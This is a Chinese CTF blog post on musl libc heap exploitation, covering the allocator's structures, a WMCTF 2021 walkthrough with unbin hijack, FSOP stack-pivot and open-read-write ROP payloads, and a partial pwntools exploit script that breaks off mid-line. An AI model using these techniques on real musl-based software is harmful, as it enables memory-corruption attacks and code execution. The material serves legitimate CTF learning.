<!DOCTYPE html>
<html lang="cn">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="musl_pwn_初探"/><meta name="keywords" content="pwn, " /><link rel="alternate" href="/atom.xml" title="null" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
<link rel="canonical" href="https://brooke-hub.github.io/2021/09/05/musl_pwn_初探/"/>

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />

<script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
</script>

    <title>musl_pwn_初探 - </title>
  <meta name="generator" content="Hexo 5.4.0"></head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo"></a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/">
        <li class="mobile-menu-item">Home
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo"></a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/">
            Home
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><article class="post">
    <header class="post-header">
      <h1 class="post-title">musl_pwn_初探
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2021-09-05
        </span></div>
    </header>

    <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">Contents</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Version-1-1-24"><span class="toc-text">Version 1.1.24</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-text">数据结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8"><span class="toc-text">常见利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMCTF-2021-Nescafe"><span class="toc-text">WMCTF_2021_Nescafe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#how-to-leak"><span class="toc-text">how to leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#how-to-hijack"><span class="toc-text">how to hijack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8Estdin%E6%BA%A2%E5%87%BA%E5%88%B0stdout"><span class="toc-text">从stdin溢出到stdout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88FSOP%EF%BC%89%E4%BF%AE%E6%94%B9-stdout-%E4%B8%8A%E7%9A%84%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%8E%A7%E5%88%B6%E6%B5%81%EF%BC%8C%E8%BF%9B%E8%A1%8C%E6%A0%88%E8%BF%81%E7%A7%BBROP"><span class="toc-text">（FSOP）修改 stdout 上的函数指针劫持程序控制流，进行栈迁移ROP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C-orw-ROP-%E8%AF%BB%E5%8F%96-flag"><span class="toc-text">执行 orw ROP 读取 flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Version-1-2-2"><span class="toc-text">Version 1.2.2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%A5%E4%BA%91%E6%9D%AF-2021-babymull"><span class="toc-text">祥云杯_2021_babymull</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-1"><span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gdb%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-text">gdb查看数据结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#malloc-context"><span class="toc-text">__malloc_context</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7-chunk%E5%90%8E%E7%9A%84malloc-context%E5%8F%98%E5%8C%96"><span class="toc-text">申请 chunk后的malloc_context变化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#meta%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">meta结构体</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#group%E9%87%8C%E7%9A%84chunk%E7%BB%93%E6%9E%84"><span class="toc-text">group里的chunk结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8A%E6%94%BE-chunk%E4%B9%8B%E5%90%8Emeta%E7%BB%93%E6%9E%84%E5%8F%98%E5%8C%96"><span class="toc-text">释放 chunk之后meta结构变化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#how-to-leak-1"><span class="toc-text">how to leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#how-to-hijack-1"><span class="toc-text">how to hijack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%96%91%E9%97%AE"><span class="toc-text">疑问</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3%E9%A2%98%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toc-text">3题待复现</span></a></li></ol>
    </div>
  </div><div class="post-content"><blockquote>
<p>准备复现5道musl pwn，其中4道都是1.2.2版本的，源码实在看不下去呜呜呜，还是跟之前学glibc一样，直接去gdb看数据来理解结构和内存管理。musl里没有malloc_hook和free_hook，所以保护全开的时候通常只能打FILE结构体。先从类似glibc的1.1.24版本入手。</p>
</blockquote>
<span id="more"></span>



<h1 id="Version-1-1-24"><a href="#Version-1-1-24" class="headerlink" title="Version 1.1.24"></a>Version 1.1.24</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://musl.libc.org/">musl libc</a> 是一个专门为嵌入式系统开发的轻量级 libc 库，以简单、轻量和高效率为特色。有不少 Linux 发行版将其设为默认的 libc 库，用来代替体积臃肿的 glibc ，如 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-cn/Alpine_Linux">Alpine Linux</a>（做过 Docker 镜像的应该很熟悉）、<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/OpenWrt">OpenWrt</a>（常用于路由器）和 Gentoo 等。</p>
<p>musl libc 堆管理器约等同于<code>dlmalloc</code>（glibc 堆管理器<code>ptmalloc2</code>的前身），因此某些部分如 chunk、unbin 与 glibc 十分相似。</p>
</blockquote>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>详细讲解 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202253#h2-4">从一次 CTF 出题谈 musl libc 堆漏洞利用</a></p>
<p>源码 <a target="_blank" rel="noopener" href="https://github.com/bminor/musl/blob/v1.1.24/src/malloc/malloc.c">v1.1.24/src/malloc/malloc.c</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> psize, csize; <span class="comment">// 相当于 glibc 的 prev size 和 size</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>psize和csize最低位都是inuse标志位</p>
<p><strong>chunk 大小：从0x20开始，以0x20跨度递增（而不是0x10）</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">uint64_t</span> binmap;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure>

<p><code>mal</code>结构体类似于 glibc 中的<code>main_arena</code></p>
<p>有三个成员：64位无符号整数<code>binmap</code>、链表头部数组<code>bins</code>和锁<code>free_lock</code>。</p>
<p><code>binmap</code>记录每个 bin 是否为非空，若某个比特位为 1，表示对应的 bin 为非空，即 bin 链表中有 chunk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>bin 是由 64 个结构类似 small bin 的双向循环链表组成，维护链表的方式是 FILO（从链表首部取出 chunk，从尾部插入 chunk）。</p>
<p>malloc大概过程：</p>
<p>根据size计算出对应bin的索引，然后查找binmap看看对应bin上有没有空闲chunk，如果有就unbin操作取出head指向的chunk</p>
<h2 id="常见利用"><a href="#常见利用" class="headerlink" title="常见利用"></a>常见利用</h2><p>取出 chunk 的过程中没有对链表和 chunk 头部进行任何检查。</p>
<p>利用unbin将目标地址插入bin中，实现任意地址写</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unbin</span><span class="params">(struct chunk *c, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">		a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">	c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">	c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">	c-&gt;csize |= C_INUSE;</span><br><span class="line">	NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="WMCTF-2021-Nescafe"><a href="#WMCTF-2021-Nescafe" class="headerlink" title="WMCTF_2021_Nescafe"></a><strong>WMCTF_2021_Nescafe</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">./libc.so</span> </span><br><span class="line">musl libc (x86_64)</span><br><span class="line">Version 1.1.24</span><br><span class="line">Dynamic Program Loader</span><br></pre></td></tr></table></figure>

<p>musl 1.1.24的版本和glibc差不多</p>
<p>chunk结构很相似，常用的小bin管理类似于smallbin的双向链表管理</p>
<p>本题exp参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39948058/article/details/120035403?spm=1001.2014.3001.5501">WMCTF 2021 pwn Azly复现</a></p>
<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a><strong>静态分析</strong></h3><p>沙箱禁用了execve</p>
<p>chunk size 0x200</p>
<p>idx 0-4</p>
<p>free后指针没置零，可以edit和show</p>
<p>只能show一次</p>
<h3 id="how-to-leak"><a href="#how-to-leak" class="headerlink" title="how to leak"></a><strong>how to leak</strong></h3><p>chunk被释放后被插入bin（mal+384），以双向链表进行管理</p>
<p>chunk的<code>next*</code>和<code>pre*</code>指针域就会被写入bin地址</p>
<p>可以uaf，直接show 得到libc地址</p>
<h3 id="how-to-hijack"><a href="#how-to-hijack" class="headerlink" title="how to hijack"></a><strong>how to hijack</strong></h3><blockquote>
<p>gdb下使用 <code>p mal</code> 可以查看所有bin</p>
</blockquote>
<p>①如下mal+384可以理解成bin</p>
<p>首先add两个0x200的chunk，bin一直指向top chunk以便下次分配</p>
<p>free chunk0后bin指向了chunk0</p>
<p>chunk0的两个指针域也指向了bin</p>
<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210911221746016.png" alt="image-20210911221746016"></p>
<p>②uaf 修改chunk0的两个指针域</p>
<p>next设置为bin-0x8</p>
<p>pre设置为目标地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk = p64(mal+<span class="number">400</span>-<span class="number">0x18</span>) <span class="comment"># mal+376</span></span><br><span class="line">fake_chunk += p64(libc.sym[<span class="string">&#x27;__stdin_FILE&#x27;</span>]+<span class="number">0x40</span>) </span><br><span class="line">edit(<span class="number">0</span>,fake_chunk) </span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210911222824673.png" alt="image-20210911222824673"></p>
<p>③根据bins的head取出chunk0的空间，作为chunk2</p>
<p>并进行unlink</p>
<p>chunk0（chunk2）的pre（即目标地址stdin_FILE+0x40）作为bin的新head</p>
<p>同时，目标地址stdin_FILE+0x40的fd被写入原chunk0的fd</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;B&#x27;</span>*<span class="number">0x100</span>)<span class="comment">#2 stdin_file </span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210911222129217.png" alt="image-20210911222129217"></p>
<p>④根据bins的head取出stdin_FILE+0x40的空间，作为chunk3</p>
<p>成功申请到目标地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x30</span>+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]+<span class="number">0x50</span>)+p64(ret)+p64(<span class="number">0</span>)+p64(mov_rdx) </span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>])+p64(pop_rdx)+p64(<span class="number">0x500</span>)+p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line">add(<span class="string">&#x27;C&#x27;</span>*<span class="number">0xb0</span>+payload)<span class="comment">#3</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210911222907607.png" alt="image-20210911222907607"></p>
<h3 id="从stdin溢出到stdout"><a href="#从stdin溢出到stdout" class="headerlink" title="从stdin溢出到stdout"></a><strong>从stdin溢出到stdout</strong></h3><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210911174349792.png" alt="image-20210911174349792"></p>
<h3 id="（FSOP）修改-stdout-上的函数指针劫持程序控制流，进行栈迁移ROP"><a href="#（FSOP）修改-stdout-上的函数指针劫持程序控制流，进行栈迁移ROP" class="headerlink" title="（FSOP）修改 stdout 上的函数指针劫持程序控制流，进行栈迁移ROP"></a><strong>（FSOP）修改 stdout 上的函数指针劫持程序控制流，进行栈迁移ROP</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mov_rdx = libc.address+<span class="number">0x000000000004951a</span> </span><br><span class="line"><span class="comment">#    0x7f687c98751a &lt;longjmp+34&gt;:	mov    rdx,QWORD PTR [rdi+0x30]</span></span><br><span class="line"><span class="comment">#    0x7f687c98751e &lt;longjmp+38&gt;:	mov    rsp,rdx</span></span><br><span class="line"><span class="comment">#    0x7f687c987521 &lt;longjmp+41&gt;:	mov    rdx,QWORD PTR [rdi+0x38]</span></span><br><span class="line"><span class="comment">#    0x7f687c987525 &lt;longjmp+45&gt;:	jmp    rdx</span></span><br><span class="line">payload = <span class="string">&#x27;E&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]+<span class="number">0x50</span>)+p64(ret) <span class="comment">#0x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(mov_rdx) <span class="comment">#0x40</span></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>])+p64(pop_rdx)+p64(<span class="number">0x500</span>)+p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;pop_rdi&#x27;</span>,pop_rdi)</span><br><span class="line">pause()</span><br><span class="line">add(<span class="string">&#x27;C&#x27;</span>*<span class="number">0xb0</span>+payload)<span class="comment">#3</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210911224458218.png" alt="image-20210911224458218"></p>
<p>这样就会执行gadget</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rdi+0x30] </span><br><span class="line"># 将stdout_FILE+0x30地址上的内容（stdout_FILE+0x50）放入rdx </span><br><span class="line"># rdi:stdout_FILE+0x30 &#x2F;&#x2F; rdx:stdout_FILE+0x50</span><br><span class="line"></span><br><span class="line">mov    rsp,rdx  </span><br><span class="line"># 栈顶指向stdout_FILE+0x50（存放了pop rdi gadget地址）</span><br><span class="line">#   rsp&#x3D;rdx:stdout_FILE+0x50</span><br><span class="line"></span><br><span class="line">mov    rdx,QWORD PTR [rdi+0x38] </span><br><span class="line"># 将stdout_FILE+0x38地址上的内容（ret gadget地址）放入rdx</span><br><span class="line"># rdx: ret_addr</span><br><span class="line"></span><br><span class="line">jmp    rdx </span><br><span class="line"># 跳到ret gadget地址，执行pop rip</span><br><span class="line"># 将栈顶的pop rdi gadget地址弹出并跳转执行</span><br><span class="line"># 继续ROP，执行完read(0,addr,0x500)</span><br></pre></td></tr></table></figure>



<h3 id="执行-orw-ROP-读取-flag"><a href="#执行-orw-ROP-读取-flag" class="headerlink" title="执行 orw ROP 读取 flag"></a><strong>执行 orw ROP 读取 flag</strong></h3><p>向__stdout_FILE地址写入如下，</p>
<p>主要是在__stdout_FILE+0x38处开始写入gadget，再次ROP</p>
<p>因为执行SYS_read后会跳转到__stdout_FILE+0x38上的地址（调试得到偏移 ）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span> </span><br><span class="line">payload += p64(pop_rdi)+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]+<span class="number">0x100</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&#x27;open&#x27;</span>]) </span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]+<span class="number">0x200</span>)+p64(pop_rdx) +p64(<span class="number">0x100</span>)+p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]+<span class="number">0x200</span>)+p64(pop_rdx) +p64(<span class="number">0x100</span>)+p64(libc.sym[<span class="string">&#x27;write&#x27;</span>]) </span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)+<span class="string">&quot;./flag\x00&quot;</span></span><br></pre></td></tr></table></figure>



<p>类似题目还有 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202253#h3-11">2020 XCTF 高校战“疫” musl-master</a></p>
<p>堆溢出漏洞，同样是利用unbin劫持</p>
<p>只写到申请出stdin，后面有点麻烦不想写了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;119.3.81.43&#x27;</span>, <span class="number">49153</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process([<span class="string">&quot;./libc.so&quot;</span>,<span class="string">&quot;./carbon&quot;</span>])</span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,believer,content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size? &gt;&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&#x27;believer? &gt;&#x27;</span>,<span class="built_in">str</span>(believer)) <span class="comment">#Y</span></span><br><span class="line">    sa(<span class="string">&#x27;sleeve &gt;&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;sleeve ID? &gt;&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;sleeve ID? &gt;&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;sleeve ID? &gt;&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">death</span>():</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========================================================leak libc</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#1 avoid consolidation</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#5 avoid consolidation</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">mal = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">24</span></span><br><span class="line">leak(<span class="string">&#x27;mal&#x27;</span>,mal)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">libc.address = mal - <span class="number">0x292ac0</span></span><br><span class="line">leak(<span class="string">&#x27;libc.address&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># =========================================================hijack bin</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># overflow chunk4(in bin)</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span 